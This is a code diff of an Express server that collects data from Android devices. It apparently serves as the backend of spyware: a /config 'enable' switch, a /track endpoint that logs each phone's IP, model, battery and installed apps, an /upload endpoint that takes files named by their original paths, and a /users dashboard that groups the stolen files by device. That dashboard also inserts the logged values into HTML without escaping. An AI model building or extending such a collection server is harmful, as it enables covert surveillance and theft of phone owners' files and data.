@@ -7,7 +7,6 @@ const app = express();
 /* ================= CONFIG ================= */
 
 const LOG_FILE = "logs.json";
-const CONFIG_FILE = "config.json";
 
 const UPLOAD_DIR = path.join(__dirname, "uploads");
 const THUMB_DIR = path.join(__dirname, "thumbs");
@@ -18,141 +17,122 @@ if (!fs.existsSync(THUMB_DIR)) fs.mkdirSync(THUMB_DIR);
 /* ================= HELPERS ================= */
 
 function getIP(req) {
-return (req.headers['x-forwarded-for'] || '').split(',')[0]
-|| req.socket.remoteAddress
-|| "unknown";
+  return (req.headers['x-forwarded-for'] || '').split(',')[0]
+    || req.socket.remoteAddress
+    || "unknown";
 }
 
 function loadLogs() {
-try {
-return fs.readFileSync(LOG_FILE, "utf-8")
-.split("\n")
-.filter(Boolean)
-.map(x => JSON.parse(x));
-} catch {
-return [];
-}
+  try {
+    return fs.readFileSync(LOG_FILE, "utf-8")
+      .split("\n")
+      .filter(Boolean)
+      .map(x => JSON.parse(x));
+  } catch {
+    return [];
+  }
 }
 
 function saveLog(data) {
-fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
+  fs.appendFileSync(LOG_FILE, JSON.stringify(data) + "\n");
 }
 
 function isDuplicate(fileName) {
-const logs = loadLogs();
-return logs.some(l => l.original === fileName);
-}
-
-function parseBody(body) {
-const obj = {};
-body.split("&").forEach(pair => {
-const [k, v] = pair.split("=");
-if (k && v) obj[k] = decodeURIComponent(v);
-});
-return obj;
+  const logs = loadLogs();
+  return logs.some(l => l.original === fileName);
 }
 
 /* ================= CONFIG ================= */
 
 app.get('/config', (req, res) => {
-res.send("1"); // simple enable
+  res.send("1"); // enable
 });
 
-/* ================= TRACK (GET SUPPORT) ================= */
+/* ================= TRACK ================= */
 
 app.get('/track', (req, res) => {
 
-const apps = req.query.apps
-? req.query.apps.split(",").map(x => x.trim()).filter(Boolean)
-: [];
+  const apps = req.query.apps
+    ? req.query.apps.split(",").map(x => x.trim()).filter(Boolean)
+    : [];
 
-const systemApps = apps.filter(a =>
-a.startsWith("android") ||
-a.startsWith("com.android") ||
-a.startsWith("com.google")
-);
+  const systemApps = apps.filter(a =>
+    a.startsWith("android") ||
+    a.startsWith("com.android") ||
+    a.startsWith("com.google")
+  );
 
-const userApps = apps.filter(a => !systemApps.includes(a));
+  const userApps = apps.filter(a => !systemApps.includes(a));
 
-const deviceId = getIP(req) + "_" + req.query.model;
+  const deviceId = getIP(req) + "_" + (req.query.model || "unknown");
 
-const data = {
-type: "device",
-device_id: deviceId,
-ip: getIP(req),
-battery: req.query.battery,
-model: req.query.model,
-brand: req.query.brand,
-android: req.query.android,
-app_count: apps.length,
-system_apps: systemApps,
-user_apps: userApps,
-time: new Date().toISOString()
-};
+  const data = {
+    type: "device",
+    device_id: deviceId,
+    ip: getIP(req),
+    battery: req.query.battery,
+    model: req.query.model,
+    brand: req.query.brand,
+    android: req.query.android,
+    app_count: apps.length,
+    system_apps: systemApps,
+    user_apps: userApps,
+    time: new Date().toISOString()
+  };
 
-console.log("\n📱 DEVICE:", data.model);
+  console.log("📱 DEVICE:", data.model);
 
-saveLog(data);
+  saveLog(data);
 
-res.json({ status: "ok" });
+  res.json({ status: "ok" });
 });
 
 /* ================= UPLOAD ================= */
 
 app.post('/upload', (req, res) => {
 
-let fileName = "file.bin";
-let folder = "unknown";
+  let fileName = "file.bin";
 
-if (req.query.name) {
-try {
-const decoded = decodeURIComponent(req.query.name);
-folder = path.dirname(decoded);
-fileName = path.basename(decoded);
-} catch {}
-}
+  if (req.query.name) {
+    try {
+      fileName = path.basename(decodeURIComponent(req.query.name));
+    } catch {}
+  }
 
-if (isDuplicate(fileName)) {
-return res.json({ status: "duplicate_skipped" });
-}
+  if (isDuplicate(fileName)) {
+    return res.json({ status: "duplicate_skipped" });
+  }
 
-const safeName = Date.now() + "_" + fileName;
-const filePath = path.join(UPLOAD_DIR, safeName);
+  const safeName = Date.now() + "_" + fileName;
+  const filePath = path.join(UPLOAD_DIR, safeName);
+  const thumbPath = path.join(THUMB_DIR, "thumb_" + safeName);
 
-const thumbName = "thumb_" + safeName;
-const thumbPath = path.join(THUMB_DIR, thumbName);
+  const deviceId = getIP(req);
 
-const deviceId = getIP(req);
+  const stream = fs.createWriteStream(filePath);
+  req.pipe(stream);
 
-const stream = fs.createWriteStream(filePath);
-req.pipe(stream);
+  req.on('end', () => {
 
-req.on('end', () => {
+    fs.copyFile(filePath, thumbPath, () => {});
 
-```
-fs.copyFile(filePath, thumbPath, () => {});
+    saveLog({
+      type: "file",
+      device_id: deviceId,
+      file: safeName,
+      original: fileName,
+      time: new Date().toISOString()
+    });
 
-saveLog({
-  type: "file",
-  device_id: deviceId,
-  file: safeName,
-  original: fileName,
-  folder: folder,
-  thumb: thumbName,
-  time: new Date().toISOString()
+    res.json({ status: "uploaded", file: safeName });
+  });
+
+  req.on('error', () => {
+    res.status(500).send("error");
+  });
 });
 
-res.json({ status: "uploaded", file: safeName });
-```
-
-});
-
-req.on('error', () => {
-res.status(500).send("error");
-});
-});
-
-/* ================= USERS (ADVANCED + LIVE) ================= */
+/* ================= USERS ================= */
 
 app.get('/users', (req, res) => {
 
@@ -170,8 +150,9 @@ app.get('/users', (req, res) => {
 
   files.forEach(f => {
     const id = f.device_id;
-    if (!grouped[id]) return;
-    grouped[id].files.push(f);
+    if (grouped[id]) {
+      grouped[id].files.push(f);
+    }
   });
 
   let html = `
@@ -194,7 +175,7 @@ app.get('/users', (req, res) => {
 
     html += `
     <div class="box">
-      <h2>📱 ${u.brand} ${u.model}</h2>
+      <h2>📱 ${u.brand || ""} ${u.model || ""}</h2>
       IP: ${u.ip}<br>
       Battery: ${u.battery}%<br>
       Apps: ${u.app_count}<br>
@@ -234,5 +215,5 @@ app.use('/thumbs', express.static(THUMB_DIR));
 const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, () => {
-console.log("🚀 Server running on port", PORT);
+  console.log("🚀 Server running on port", PORT);
 });
